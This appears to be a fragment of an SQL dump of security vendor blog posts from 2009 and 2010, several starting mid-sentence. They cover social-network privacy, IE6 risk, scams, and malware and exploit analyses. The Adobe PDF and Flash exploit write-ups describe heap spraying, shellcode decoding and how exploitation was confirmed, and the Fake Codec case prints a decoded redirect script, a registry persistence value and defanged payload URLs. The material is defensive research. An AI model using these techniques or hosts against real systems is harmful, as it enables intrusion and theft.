Check out Buzz” brings you to your initial follower/follow back network of friends:          And as the privacy statement suggested, it automatically determined people who have communicated with me over Gmail and that joined Buzz to follow me. Similarly Buzz made suggestions on whom I should follow. From the Buzz privacy statement:          For me, the default web apps connected to Buzz were my public facing Picasa and Google Reader:        By default, (as stated in the Google Privacy statement) the list of people that I am following and the people following me will be publicly displayed on my profile.             As numerous folks have blogged about (e.g., CNET), this could be a privacy concern for users who do not want to share their social network with the world. As with other social networks, this could be used to gather intelligence on individuals, the corporations/organizations/groups they belong to, and could be used in targeted spear phishing or impersonation attacks. To the general user on the web however, many of the benefits of social networking out-weigh the risks.    In addition to these concerns, there are also a few other items that Google Buzz brings to the table for an attacker. One item in particular is email validation. I clicked on one of my co-worker\'s that was following me from his default setup for his Buzz profile … I was able to then see the people that he is following and those following him (again, default setting). The people in his social network that I had emailed in the past from my Gmail account have their email address exposed, those that I had not emailed in the past did not have this exposed.        A user with a Buzz account, means that they have a Gmail account, and the name visible in Buzz is often used in some form or another as the user\'s Gmail account. As a spammer, one could create a network of Gmail accounts connected to Buzz and follow a large number of users, follow their followers, etc. Harvest user names / alias names for those being followed, and do best guess attempts at guessing their email address and start sending test messages. Once a successful guess has occurred, the email address will then be exposed in the Buzz interface validating that the email address exists and is tied to that user.         The way this would likely work and scale for the spammer is through the creation of an automated Google Buzz bot or worm to build a list of followers and spider out to the followers of followers and so forth in order to harvest Gmail names / aliases to guess against and build an email spam list. The email validation not only validates that the email account is live, but validates that it is linked to the social network visible in Buzz. In other words, knowledge of that particular user\'s social network could also be used in an automated but more targeted spam campaign. For example, email subject \"Hey I see you are friends with XYZ...\" email body: \"Here are some pictures of her that I thought you would get a kick out of: insert malicious link/attachment\" (remind you of Koobface?).         Additionally, once a user is connected / followed in Buzz you can interact in other mediums besides email.

I say not so fast. The effort to rid the world of IE6 has been going on for some time but a couple of recent high profile events have brought this issue to the masses. The first was Operation Aurora, the Advanced Persistent Threats that allegedly came out of China and infiltrated Google, Adobe and 30+ other large corporations. While the vulnerability used to install the Hydraq Trojan at the core of the attack affected all supported versions of IE, the exploit leveraged, only worked against IE6. Why? Because IE6 lacks advanced security protections found in IE 7 & 8. The second story making the rounds this week is that Google has taken a stand and starting next month will phase out support for IE 6, starting with Google Docs and Google Sites. I applaud this move. Only when end users can\'t access their favorite sites will we finally see an across the board upgrade that should have happened years ago.         Enterprises argue that there is no urgency to upgrade beyond IE 6 as it is still a supported browser. I argue that as a CISO, you\'re flat out negligent if you haven\'t fought to get IE 6 off of your network. Just because a product is still supported doesn\'t make it secure. Yes, Microsoft will release security patches when IE 6 breaks, but IE 6 lacks numerous security features found in IE 7&8. Features like DEP, ASLR, malicious URL/phishing block lists and XSS/Clickjacking protections. This is why IE 6 is targeted by attackers, because it is the low hanging fruit in the browser world.           One thing is bothering me though. I keep hearing how IE8 is making great strides and that IE6 is finally dying off. I read numerous articles this week covering the NetApplications January 2010 report, which revealed how IE8 has now overtaken IE6 in terms of market share. Whenever I see such data I ask myself what the sample population is. Generally, such data is collected from server logs. As such, it represents a broad spectrum of end users, including both corporate and personal web traffic. I have long believed that individuals are more likely to upgrade web browsers than corporations. Afterall, we all want the latest features and software upgrades are just a click away. Corporations on the other hand don\'t generally allow users to decide what software runs on their desktop and from a security perspective, they shouldn\'t. They also tend to focus on concerns over breaking functionality, often to the detriment of security. What I\'m interested in is seeing the percentage of browser market share for only corporate users. This is something that Zscaler is in a strong position to answer. We sell an enterprise offering, so our clients tend to be corporations or government entities. Being a SaaS offering, any web capable device can utilize the Zscaler cloud and certainly some enterprises have traffic from user owned/controlled devices (personal laptops and smartphones) running through the cloud as well, but it\'s fair to say that overall, our view of the world is primarily enterprise traffic as opposed to personal traffic. I therefore ran a query to determine the results of web browser usage on our network for all of Q4 2009. As you can see, our results are very different than the results from NetApplications. From October to December 2009, 72.21% of the traffic that we saw came from IE browsers. The pie chart breaks this traffic down to reveal the individual versions of IE encountered. Not only is IE6 still in the lead but IE8 is barely on the map, a finding vastly different from the NetApplications stats which show IE8 in the lead. My conclusion? Enterprises are not moving away from IE6 as quickly as the web population as a whole.         Let\'s hope that recent events such as Operation Aurora and Google\'s stand to drop IE6 support cause enterprises to better understand the urgency of this issue. Let\'s further hope that Microsoft puts IE6 out to pasture once and for all.         - michael', 'Microsoft', 'https://www.zscaler.com/blogs/research/death-ie-6-greatly-exaggerated');

Outdated Web Browsers Leave a Gaping Security Hole         Just because software hasn\'t reached end-of-life status isn\'t justification for using it. It has been a long standing gripe of mine that IE 6 continues to control significant market share in the enterprise. Any CISO that hasn\'t fought to change this should be fired. Yes, IE 7 & 8 are also allegedly vulnerable but public exploit code seen to date has not successfully exploited these versions of IE. Why? Because they have additional security measures that make this vulnerability harder to exploit. In this case, the protection making the difference is Data Execution Prevention (DEP) but additionally, they include a number of additional protections such as Address Space Layout Randomization (ASLR), malicious URL/phishing blacklists, XSS protection, etc. The answer is not to avoid IE altogether as Germany and France suggest, but at a minimum, enterprises must ensure that they are running the latest browsers, with the most current security protections.         3.) 0Day, Targeted Attacks are Very Hard to Defend Against         Perfect security lives on Pandora. We live on Earth. Don\'t waste time looking for it.         When an attacker possesses a weapon that you haven\'t seen before, you are at a significant disadvantage. 0day attacks present a fundamental challenge because we don\'t know what we\'re looking for. Combine that with a knowledgeable adversary that can effectively employ social engineering and no matter what security measures you have in place, at some point you will be compromised. Should we roll over and give up? Of course not. The goal is not perfect security but rather to mitigate threats to an acceptable level. We can achieve that by employing defense-in-depth and assuring that our detective controls are sufficient to understand the extent of damage, control it and quickly recover should a breach occur.         4.) The Best Defense is a Good Offense         One of the more surprising angles to this story has been the revelation that Google went on the offensive to get to the bottom of the attack. While such an approach can put an organization in a legal grey area, it is unlikely that Google would ever have had the evidence necessary to be confident of the origin of the attacks and the fact that some 33 other companies were affected had they not broken into a server in Taiwan. Did Google coordinate it\'s efforts with law enforcement? Is this a tipping point in the evolution of cyber warfare, when corporations frustrated with the red tape encountered by law enforcement crossing international borders begin to take matters into their own hands?

Web transactions to donations sites range from:      	The mainstream, for example, RedCross  	The more obscure, for example, a personal blog (haitirescuecenter.wordpress.com) of an alleged worker in Haiti.  	The suspicious, for example, haitipal.com that links you to a PayPal donation to the user haitipal{at}hotmail[dot]com.

Now, we have a malicious script in readable format and want to know if this successfully runs or not. I am not going to run the original malicious file for now. I will replace the original shellcode with a simple one which will open a “calc.exe” after successful exploitation. The problem is the original malicious PDF file is in encoded format so we can’t edit the malicious script inside the file. For that I will create a new test PDF file using “make-pdf-javascript.py” tool from PDF Tools. This tool will create a simple PDF file containing JavaScript which will display a message box once opened. I am going to add malicious JavaScript code inside this file using command,    D:\\make-pdf-javascript.py --javascriptfile=Malicious_Script.js test.pdf    I am going to use another shellcode which will open “calc.exe”. Here is the newly created PDF file:            Let’s open it and see if this exploit works. This time it only crashed and did not opened a “calc.exe”. But I got a chance to look into the debugger. Here is the state of the ollydbg debugger,            The EDX currently points to zero and it is trying to CALL DWORD from [EDX +4]. Since it is zero, it has an access violation exception. Further we found that the module is “C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\plug_ins\\Multimedia.api”. Let’s change some EDX values manually in the debugger to see if this is going to work or not? Since we have already filled a heap we need to change values accordingly. I found our NOP sled and shellcode gets loaded at “0A0A0A0A” address, so this is the value we are going to use. Here is the state of ollydbg once I modify the values,            Now, EDX points to “0x0A0A0A0A” address and [EDX + 4] contains address “0x0A0A0A20” which is our NOP sled. So once I press “F9” (run) button in Ollydbg, it will jump to “0A0A0A20” address and will execute everything from there on. You can see this step by step during debugging. Yes, it has executed the NOP sled and our shellcode and “calc.exe” opened on the machine. But this was done by changing the values manually. It looks like there is problem with memory corruption. I played a little bit with the code and found that we have to add one more line of the vulnerable function before try{} block. Here is how new modified code will look,            Once I run this file again, the shellcode executed successfully and it showed a classic POP up box with error message and opened “calc.exe”,                 From above, it is clear that there is memory free issue with the vulnerable method “util.printd()”. It required calling this method twice with the try {} block. The code gets executed successfully and opened a calculator. This means if we now remove the “calc.exe” shellcode and use the original shellcode, then it is going to execute in the background without any notice. I am not going into more details of the original shellcode this time due to length of the blog post.    That is it for this series.

This is now identified as CVE-2009-4324. Adobe acknowledged the same on their website saying they are investigating this issue. And as usual, it is not the first time that PDF’s are being targeted for exploitation. Earlier we saw that Flash files are being targeted, taking advantage of known vulnerability in the wild. This time it is an Adobe zero day vulnerability being exploited in the wild. A colleague provided me with a sample PDF file exploiting this vulnerability in the wild. I started looking into it in depth. The PDF file was obfuscated and not in the readable format. I used my favorite “pdf-parser.py” from PDF Tools. I ran the malicious PDF file through this parser and took the output of every element of PDF file in a text file. Here is how it looks:              The output file was very big and I wanted to the malicious script code inside it. As I said earlier, the file was obfuscated and contains a lot of objects/elements inside. I was only interested in the some strings like JavaScript, FlateDecode, etc. I tried to search for these blocks inside the output file and I found some of interest:                  The above screenshots show some of the interesting blocks and which were used to uncover the malicious code inside. The “pdf-parser.py” tool has some very good options to parse the certain objects inside the file. I looked at the documentation of the tool and some of the options looked valuable to me. Here are some options and documentation directly copied from PDF Tools site.    “Filter option applies the filter(s) to the stream. For the moment, only FlateDecode is supported (e.g. zlib decompression). The raw option makes pdf-parser output raw data (e.g. not the printable Python representation). Objects outputs the data of the indirect object which ID was specified. This ID is not version dependent. If more than one object have the same ID (disregarding the version), all these objects will be outputted.”    This is what we need for running against suspicious blocks or objects inside PDF file. I then ran a command against this object tag ID 110 using command like,    D:\\ >pdf-parser.py --object=110 --raw –filter malicious-file.pdf > output.log    The command run successfully and I was interested to see if we get any interesting data in the output file. I opened the file and found very suspicious and obfuscated JavaScript code:             Now, from this it was easy to work. I opened Malzilla (malware hunting) tool and copied above script into decoder section of the tool. I ran the ‘Run Script’ button and found another script but it was in readable format. Here how it looked:             Let’s copy this and put it in a text file so that we can able to see whole script. This is a screenshot of full script used in the PDF file,             If you look at the strings and code above, it is clearly a heap spray code and this code relates to adobe reader. It is checking the version of application and if the application viewer version is greater than 8 then only it will exploit the vulnerability. This identifies that it is targeting latest Adobe reader. There is also one JavaScript function called “util.printd()”, one try{}-catch{} block and this looks the culprit. This function returns a date using a specified format according to documentation on Adobe. If you look at the parameters passed to this function, it is invalid and contains @ and some long numbers. This is likely the vulnerable method causing memory corruption in Adobe reader.    This is the first blog on the series and I will provide more information in the second blog of this series. The second blog will cover if the exploit is successful or not and how it can be leveraged further. I mentioned earlier in the Flash blog series as well that new zero day vulnerabilities continue to be discovered in the wild affecting popular applications like Adobe.

Budgets were slashed and security departments were forced to do more with less, all while cybercrime rates rose as frustrated individuals used whatever means necessary to earn in a difficult economic climate. What 2010 will bring remains unclear but as we approach the New Year, optimism is beginning to emerge.    On the technology front, the ‘cloud honeymoon’ is over and now the hard work begins. Mobile is as exciting as ever with new platforms and functionality emerging with vendors battling for dominance. Social networking winners have been established, but we’re just beginning to see their true potential. Much remains to be seen but one thing is for sure – attackers are following these trends just as closely as the enterprises and consumers that benefit from them. That which becomes popular today, will be the attack vector of choice tomorrow. Below are our security predictions for the New Year.    1.) Apple is forced to climb the security learning curve    Apple has for some time been considered to have a safer operating system in OS X as it is less often targeted by attackers. While that may be true, it is less secure overall and Apple\'s increasing market share will force them to finally invest in security due to increasing attacks targeted at Apple devices.    2.) App Store Party Crashers    App stores are all the rage, with every mobile vendor racing to replicate Apple\'s success. Generally, vendors stand guard and only let in the applications that they feel are appropriate. Consumers mistakenly believe that this ensures that only secure applications can be obtained but that is not the case. Security testing is limited at best with app developers already having success slipping in apps with undocumented APIs. Attackers will take things one step further and slip malicious apps in under the gatekeeper\'s watch.    3.) Web based worms go prime time     We\'ve been teased with a variety of web based worms from Samy to StalkDaily. Most have been experiments as opposed to planned attacks with the goal of financial gain. That\'s about to change.    4.) The emergence of the web platform    We\'ve gone from web sites to web applications and we\'re now seeing the birth of the web platform. Social Networking sites such as Facebook have gone beyond delivering dynamic applications welcoming user-supplied content. They have now evolved into platforms inviting user-supplied functionality, allowing virtually anyone to develop unique applications within their ecosystem. Attacker will take advantage of this to deploy malicious applications on social networks and the sites will struggle to identify and block them before deployment.    5.) Attackers turn to the cloud    The cloud offers unprecedented storage and processing power at an attractive price. Think that\'s only attractive to enterprises? Think again.    6.) The arrival of financial DDoS attacks    Cloud based services generally charge based on actual consumption. This provides attackers with incentive to hold enterprises hostage by artificially inflating costs. Unfortunately, cloud providers have little incentive to stop this practice.    7.) Poking holes in the cloud    My greatest hope for 2010 is that marketing departments will give the term \'cloud computing\' a well-deserved break. 2009 saw great interest in the development of cloud computing architectures and one must wonder how often security was sacrificed in order to get to market quickly. Expect attackers to devote time to poking holes in the APIs of cloud providers. When they\'re found, thanks to multi-tenant architectures, it will have been worth the effort.    8.) Clickjacking comes out of hibernation    Clickjacking roared onto the scene in the summer of 2008 when Jeremiah Grossman and Robert Hansen had their OWASP talk delayed at the request of Adobe. The sensational web cam/microphone hack that drew media attention has been addressed, but the overall flaw still remains. Clckjacking can be a valuable tool in a social engineering attack and we’ve just begun to see it leveraged in attacks.    9.) Browser vendors finally start to take XSS seriously    I was very encouraged when Microsoft released IE 8 this year and it included cross-site scripting (XSS) protection. For all of the heat that Microsoft takes for security vulnerabilities, they continue to be a leader when it comes to adding innovative security features and this was another example. I’m confident that other browser vendors have taken notice and will fall in line.    10.) Past Data Breaches will look like child\'s play    This is by far the easiest prediction to make.

Dancho Danchev\'s blog often details this campaign as well. While the campaign hasn\'t changed that drastically from its inception, I thought I\'d provide an overview of a case seen this morning to highlight its current state.    This morning\'s case used a LastFM user profile to advertise a Britney Spears sex tape:  hxxp://www.last.fm/user/BritneySpears33    LastFM is not the only victim of having malware campaigns advertised through their social networking interface (other examples where Fake Codec / AV malware has been advertised include other popular social sites: LinkedIn, Hi5, Digg, Scribd, and yes Facebook).    Here are a few more examples of these advertisements seen in LastFM (be careful if you follow these links): example 1, example 2, and example 3.    The Shoutbox portion provides a link to kick-off the \"fun-filled\" viewing for the unsuspecting victim ...    The link directs the would-be victim to: hxxp://bigtubeforyou.com/mirolim-video/5.html  which presents the browser with the obfuscated Javascript:    which decodes to:  var1=71;var2=var1;  if(var1==var2) document.location=\"hxxp://evamendesochka.com/go.php?sid=<num>\";    The \"sid\" parameter allows the client to cycle through a round-robin of 302 redirects to Fake Code / AV malware sites including:    hxxp://showmelovetube.cn/tube.htm  hxxp://door-ringer.cn/?pid=116&sid=299a9c  hxxp://tinytubetv.com/xplaymovie.php?id=45233    With malware downloads to:    hxxp://tubefreewatch.cn/1/install_plugin.exe  hxxp://windows-antivirus2.com/download/Inst_116.exe  hxxp://clearcristalmedia.com/flash-HQ-plugin.45233.exe    Some of the A records for the above used domains:  bigtubeforyou.com. 3600 IN A 66.36.248.253  evamendesochka.com. 2123 IN A 66.36.231.29  showmelovetube.cn. 2145 IN A 66.36.248.253  tubefreewatch.cn. 3600 IN A 66.36.248.253    NS records for the above used domains include:  ns1.kimmusha.com. 172513 IN A 66.36.231.29  ns1.evamendesochka.com. 172800 IN A 66.36.231.29    Taking a look at the 66.36.0.0/19 rwhois for this hopone.net block shows that the two IP addresses used in this campaign are specifically swipt out for the \"sls-db4p12\" network name, \"svservers\" organization:      The sls-db4p12 network name identifies the IPs as being part of superb.net network. The organization, svservers has been identified (again, dating back to 2006) in the past involved in supporting spamming / hacking operations. SvServers is a Russian dedicated hosting service:      These redirect / malware domains will be updated by the malware provider as they are discovered and blocked (e.g., by Google / browser alerts). One out of the above three was in my browser\'s alerts at the time of writing this up.

A typical path is C:\\Documents and Settings\\[UserName]\\Application Data.    The malware also modified the registry key:  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  with value  atmsyssound = \"rundll32.exe \"%AppData%\\atmsyssound\\atmsyssound.dll\", DllInit\"  so that atmsyssound.dll runs its initialization function DllInit every time Windows starts.    No network traffic was observed after infection. There is an identifiable string in the binary, (beyond the function calls from imported Windows DLLs): dvyllawnx.dll. Googling for atmsyssound.dll, cryptwm97.dll, and dvyllawnx.dll revealed no results. While the exact functionality of the binary is currently unknown, odds are that it is an information stealer of some kind or backdoor similar to Zlob (which has been the typical payload of these Fake Codec attacks). I plan to conduct further analysis on the payload and will share in a future blog post if it is interesting.    Some lessons from this:      	Social network sites allow users (including malicious users) to post / advertise content (including malicious content).  	While browser alerts and anti-virus products are good tools, they are not very effective by themselves.  	The Fake Codec / AV campaign is still alive and well after all these years, and these and other malware campaigns will continue to adapt to social networking advertisements and difficult to detect / analyze payloads.', 'Malware', 'https://www.zscaler.com/blogs/research/case-study-fake-codec-leveraging-lastfm');

Some are so desperate to move into the lead that they\'re pulling out their credit card to get there. Those gullible enough to participate in the growing number of Twitter Follower scams are sure to be disappointed.\r\n\r\nScammers are setting up websites promising to provide Twitter followers to anyone willing to sign up. There are typically two levels of membership - basic and VIP. A basic membership offers followers in exchange for the right to \"use your account to promote [their] services\". Effectively, you are handing over your Twitter username and password to a third party that will then leverage your account to promote their service. In return, you are promised Twitter followers. In our tests, we received no followers but were signed up to follow a couple of hundred accounts that were presumably either fake accounts setup by the service or other victims. How do they make money? In part through advertising on their webpage but primarily by convincing individuals to become VIP members. To become a VIP member, you must either recruit others to sign up for the service or pay for the privilege. VIP membership comes with the promise of \"100-400 [new followers] each day\". If you choose to take the recruitment route, when initially signing up, you are provided with a unique URL that is to be given to others for signup. This will supposedly allow the service to keep track of your recruits and promote you to VIP status free of charge after 15 additional accounts are recruited. We attempted to promote our test accounts to VIP status this way; however, the domain name in the URL provided did not resolve and the request would therefore fail. Effectively, this leaves paying a monetary fee as the only option to achieve VIP status.\r\n\r\nThe Scam\r\nPromotion\r\nTweets sent from the accounts of past victims promote one of the many websites driving the scams. The URL is always obfuscated using a URL shortener and numerous URL shortening services are leveraged\r\n\r\nCommon Tweets\r\nIf you want 400 followers a day use…\r\nIf you wantt 100 followers a day use…\r\nI got 100 followers using…\r\nI just got 400 followers using…\r\nto get 400 followers a day…\r\nIf you want to get alot of followers check out…\r\nHey I just got alot of followers using…\r\nI got 100 followers in a day using…\r\nGet 500 followers a day using…\r\nTHE BEST WAY TO GET MORE FOLLOWERS…\r\nOUR GOAL IS TO GET U MORE FOLLOWERS…\r\nThis site got me 200 followers quick…\r\nWant FREE VIP, 100 new followers instantly and 1,000 new followers next week?\r\nThe best way to get 100 followers faster is using\r\nHey I just got alot of followers using\r\n\r\nCommon sites\r\nhttp://followersquick.info/\r\nhttp://tweeterspeed.com/\r\nhttp://twittfollow.com/\r\nhttp://followquick.info/\r\nhttp://tweeterleaders.info/\r\nhttp://twittfollow.info/\r\nhttp://wannafollowme.com/\r\nhttp://twtfast.info/\r\nhttp://twitter-builder.com/\r\n\r\nWhois information and IP address lookups suggest that at least some of the aforementioned websites are run by the same individuals. A number of the sites resolve to a single web hosting company in Malasiya and use the WhoisGuard service to hide registration information for the domains in question.\r\n\r\nPropagation\r\nWhen a user visits the site and enters their Twitter name and password, they have effectively handed over control of their Twitter account to a third party. The scammers will then use that account to futher promote the service. The user may receive a handful of followers but in our experience, they are simply fake accounts set up by the scammers themselves, if any followers are received at all. One of our favorite touches…the \'I agree with the rules\' checkbox on the signup page, can\'t be unchecked.\r\n\r\nRevenue\r\nVIP membership comes with the promise of \"100-400 [new followers] each day\". It can supposedly be obtained by either recruiting others to sign up for the service or by paying anywhere from $20 to $1,500, depending upon the duration of your VIP status (4 days to one year). Most scams leverage PayPal to complete the transaction. While it’s unclear how many people are actually pulling out their credit card to participate, the volume of Twitter accounts seen that have apparently signed up for the service, along with the number of scams emerging, suggest that the scam is successful.\r\n\r\nSadly, the scammers are actually rather straight forward about what they\'re doing, if only victims were to take the time to review the \'rules\':\r\n\r\n\r\n	You have to add all vip users and 20 regular users to join the train.\r\n	We may use your account to promote our services, with the exception of VIP account.\r\n	The fee for VIP is non-refundable.\r\n	After payment, give us up to 6 hours to update your VIP status.\r\n\r\n\r\nHow Successful is the Scam?\r\nSearching for either the phrases used to promote the sites, or the shortened URLs themselves shows that thousands of people are signing up for the services every day in the hopes that it will increase their number of Twitter followers. The screenshot below indicates that for only one of the sites, hundreds or Tweets Per Hour (TPH) are appearing in the Twitter live feed. What\'s not clear is how many people are taking the additional step of sending money to become VIP members.\r\n\r\nTwitter\'s Response\r\nWhat is Twitter doing about the scams? Nothing. Thousands of tweets promote the scam sites every day and they aren\'t hard to find. Twitter could easily be implementing filters to identify common phrases or URLs. Beyond this, common phishing blacklists such as PhishTank.org and Google’s SafeBrowsing, are largely ignoring such sites as well.\r\n\r\nConclusion\r\nThese sites are scams, plain and simple. In our experience, signing up for the service will ensure that your account is used to send out Twitter spam to promote the service and follow hundreds of other accounts but result in no meaningful additional followers. We chose not to pay for the VIP service but even if followers are added, they will simply be other victims or fake accounts created by those running the scam. If simply building up the number of followers on your Twitter account is of that much importance, regardless of who they are, take the time to create a bunch of fake Twitter accounts on your own – it’s free. If you have signed up for such a service in the past, we recommend changing your Twitter password immediately to ensure that the service can no longer post messages on your behalf. Your account could be used to post content that you don’t approve of and if so, good luck explaining why you shared your Twitter credentials.', 'Scam', 'https://www.zscaler.com/blogs/research/twitter-follower-scams');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (569, 'In The Wild Flash Exploit Analysis – Part 2', 'ThreatLabz', 'September 18, 2009', 'In the first blog, we talked about how a recent Flash exploit works using heap spraying. In this blog, we will see how the shellcode functions and how it downloads malicious binaries to an infected system. If you remember, malicious shellcode was loaded on heap by the exploit. So let’s try to see if we can identify strings or URLs in the loaded shellcode. If you look closely, the shellcode is not in a readable format and appears to be encoded. Here is the how shellcode looks:        There is no single identifiable string in the shellcode. Let’s debug this shellcode further to understand if it is encoded or not. When we left off in the last blog, we were at a “CALL EAX” instruction with EAX pointing to 08080808. If we press F9, we will land on the heap and start executing every NOP instruction until ultimately reaching the malicious shellcode. We will reach the first instruction of the shellcode by putting a hardware breakpoint in the shellcode. Here is another screenshot of the debugger:        The shellcode contains some unused instructions and it will be difficult to understand it simply using static analysis. Let’s start debugging step by step. The first few instructions are the same and will POP EAX from stack. Then there is short jump call to 08089C42, which will call the address 08089C32. At which point it will XOR the ECX value and push a value of 3B8 (decimal 952) into CX. Then there is small loop, which is very interesting.    08089C3A 80340B BD XOR BYTE PTR DS:[EBX+ECX],0BD    08089C3E ^E2 FA LOOPD SHORT 08089C3A    The first instruction is XORing every byte with 0BD from the last byte i.e. starting from value (EBX+ECX) until the current EBX value as ECX will start decrementing. This is the method used to encode the original shellcode. After exiting from the loop, we land into decoded shellcode which can now be reviewed. Here is the XOR’ed version of original shellcode:        Gr8! Every instruction is now readable and easy to understand. We can now attempt to identify strings. I went into a memory dump of the heap and converted instructions into Hex/ASCII format. Here, I was able to find some known strings and one URL at the end. Here is the ASCII dump:        Now, this looks pretty straightforward. The above decoded shellcode is going to download “css.exe” to the infected system. At this point, I downloaded the malicious file. Let’s open it in OllyDbg and try to find some additional strings and to see what that executable is doing. I quickly looked at the disassembly and was able to quickly realize what the file is doing. I found an additional URL request in the code:        This executable downloads additional malware by visiting “hxxp://www.ffxiname.com”. Then it will add some registry values and run library “C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\300056251037don.dll,Set1” using \"C:\\WINNT\\System32\\rundll32.exe”. The TEMP directory will be full of additional malicious executables and DLL’s. The website in question (“ffxiname.com”) appears to be a drop zone, containing numerous additional exploits. The site will deliver different exploits based on the browser issuing the request. Here are some wireshark packet captures from the website:                The site is exploiting browser specific vulnerabilities to push additional malware. This is not the end of this process. It also downloads,    hxxp://www.40sys40.cn/txt/a1.exe    hxxp://www.40sys40.cn/txt/a2.exe    hxxp://www.40sys40.cn/txt/a3.exe    hxxp://www.40sys40.cn/txt/a4.exe    Additionally, two DLL’s are downloaded into the temp folder. The names of the files are “231053kou.dll” and “231054eve.dll”. Based on strings identified in the DLLs, it appears that they are used to sniff passwords for various web domains as can be seen in the following screen capture:             As can be seen, the initial infection due to the Flash vulnerability is only the start of the process. Successful exploitation leads to additional malicious binaries being downloaded to the infected system. The exploit also led to the installation of malicious DLL’s, which steal valuable information such as login credentials when you visit popular web sites.    That’s it for this series. Remember, this chain of infection was triggered when a victim with a vulnerable Flash Player simply viewed a single malicious page – no user intervention was required. This also shows that how active Flash exploits are in the wild. Keep your systems/AV up to date and install latest Flash Player from Adobe.

The blocked URL was ‘hxxp://www.39sys39.cn/htm/ie.html’. He wanted details about the threat present on the page. I downloaded the page and found out that it contained obfuscated JavaScript with heap spray code. I also found that the exploit contained an tag with a source file called “xp.swf”. At first glance, it was clear that the page is trying to exploit a Flash vulnerability. The exploit code is shown below:        The above exploit employed simple obfuscation to evade signature engines. If we decode the above script, we find the following:        It is also spraying the heap on an address of “0x08080808”. Shortly, we will learn why this address is needed to exploit the vulnerability. I downloaded both the “ie.html” and “xp.swf” files for further analysis. I also uploaded the “xp.swf” file to Virustotal to see if it was a known exploit or perhaps zero day content. Only 9 out of 41 antivirus engines detected the file as a virus. Those that did, identified the file as an exploit attacking CVE-2009-1862. This is a recent vulnerability, for which exploit code is currently in the wild, affecting Adobe Reader and Adobe Flash player. To check if the exploit was working properly, I replaced the shellcode in the exploit with simple shellcode that will execute “calc.exe”. I opened this file with both Firefox and Internet Explorer and here is what happened,        The JavaScript code successfully exploited the known vulnerability in Flash and executed our replacement shellcode to open “calc.exe”. This demonstrates just how dangerous the vulnerability is as it requires a victim to simply visit a malicious page containing the Flash exploit. No further user intervention is required. In this case, I had replaced the original shellcode for testing and the exploit opened calculator successfully. Next, I wanted to determine the purpose of the original shellcode, so I then modified the original exploit code to force a crash in order to debug further. I ran the file again, this time with Internet Explorer and received the following popup message:        The referenced memory address in the above figure is “0x08214408. The program is unable to read data from an invalid address, which led to a crash. Now if you remember, the original exploit in the first image of the blog uses the “0x08080808” memory address to spray the heap with shellcode. Bingo! This means the program is crashing may be due to memory corruption. That is why the exploit must spray the heap with an address of “0x08080808”. I then clicked on cancel button to debug further. I wanted to find which instruction actually reads the data and calls the shellcode. Here is the first state of the OllyDbg debugger:             Look at the above instructions. The register EDX is trying to read a value from ESI which points to invalid address 08214408. Let’s analyze the instructions that follow.    MOV EDX,DWORD PTR DS:[ESI]    MOV EAX,DWORD PTR DS:[EDX+44]    PUSH EBP    MOV ECX,ESI    CALL EAX    TEST AL,AL    Let’s assume [ESI] contains some value which is moved to EDX. Then EAX will contain the value [EDX+44]. Then the program will push EBP on the stack, move the ESI address to ECX and look at the next instruction “CALL EAX”. This is where a call has been made to execute the shellcode. We can conclude that if we spray the heap with 08080808 and shellcode, [ESI] will contain 08080808, which will be moved to EDX. EAX will also contain 08080808 which will be called after the “MOV ECX, ESI” command. Then this call will jump to heap memory at an address of 0x08080808 and execute the shellcode. Let’s see if that holds true.        This time I reopened the original exploit in the Firefox, put a breakpoint at the above-mentioned instructions and sure enough, we were right. EAX now points to 08080808 and the heap is sprayed with 08 bytes and shellcode. If I press “F9” to continue, it will jump onto the heap area and will execute the instruction found. The instruction 0808 is effectively a NOP sled. It is simply “OR BYTE PTR DS:[EAX],CL” which will do nothing as CL contains 08. It will reach the shellcode by executing 0808 instructions and ultimately execute the malicious code.    This means some field/value from the malicious Flash file is causing memory corruption. Here is the how original shellcode is loaded into memory,        This is just overview of how this exploit works. In the next part we will see what original shellcode does. Specifically, we will identify the additional content downloaded to the victim’s machine.    This exploit proves that flash exploits can be very dangerous. Such exploits do not require user intervention. Simply by visiting a malicious web page, the victim will be exploited.    That’s for part 1 now. Do come back for part 2 of this blog.

For example, http://kingsofaldora.atspace.com/ is now being blocked (wasn\'t yesterday) and http://1001porngalleries.com/ is still not being blocked on the iPhone, despite being blocked by Safari for OS X. We\'ll need to hear from Apple to know for sure but I suspect that the failed blocking is related to phishing updates not being delivered to the iPhone as opposed to as issue with the functionality itself.]    I\'ve complained in the past that mobile browser vendors have not learned from past mistakes. Despite the fact that functionality such as phishing and malicious URL black lists are now common place in mobile web browsers, their mobile counterparts have virtually no security controls whatsoever. I was encouraged when Apple announced anti-phishing protection with the release of iPhone OS 3.0.                    iPhone OS 3.0 was released on June 17, 2009 - three months ago. Despite that fact, I don\'t recall ever having received a phishing block message on the iPhone. Today, Apple released iPhone OS 3.1 and once again specifically called out phishing protection. In fact, within the Safari settings, there is now a Security section with a Fraud Warning option. By selecting this option, which is on by default, you will be \"warn[ed] when visiting fraudulent websites\". Sounds great. The problem? It doesn\'t work.         Apple\'s Safari web browser, leverages Google\'s SafeBrowsing initiative to block both malicious URLs and phishing sites. Not so for mobile Safari on the iPhone. Apple has only chosen to only target phishing sites on the iPhone. While Apple would likely argue that malicious content on web sites target browser specific vulnerabilities, that\'s not much of an argument. Attacks that I refer to as naked browser attacks such as cross-site scripting (XSS), cross-site request forgery (CSRF) and Clickjacking don\'t discriminate - they impact all browsers equally. Moreover, past Apple vulnerabilities suggest that there is no shortage of code sharing between the iPhone OS and OS X. After all, the initial iPhone jailbreaks leveraged a known vulnerable TIFF rendering library.         Beyond this, the phishing protection on the iPhone is ineffective. I\'ve tested a variety of online/validated phishing sites from PhishTank. They were generally blocked by Safari, but none were blocked by Safari Mobile. In fact, I have yet to identify a single phishing page blocked on the iPhone. What\'s clear here is that the functionality for the iPhone is not equivalent to what is being employed by OS X. Why? Apple touts Mobile Safari as the killer app that finally makes surfing the web on a mobile device a realistic proposition and the numbers back up that claim. Surely I can be phished on the iPhone just as I can fall victim browsing the web on my laptop.         If you identify phishing sites blocked by the iPhone OS 3.1 software, please post the link to the blog comments. If you work for Apple, please comment on why you went with watered down phishing protection on the iPhone.         - michael', 'Apple', 'https://www.zscaler.com/blogs/research/watered-down-phishing-protection-iphone-os-3x');

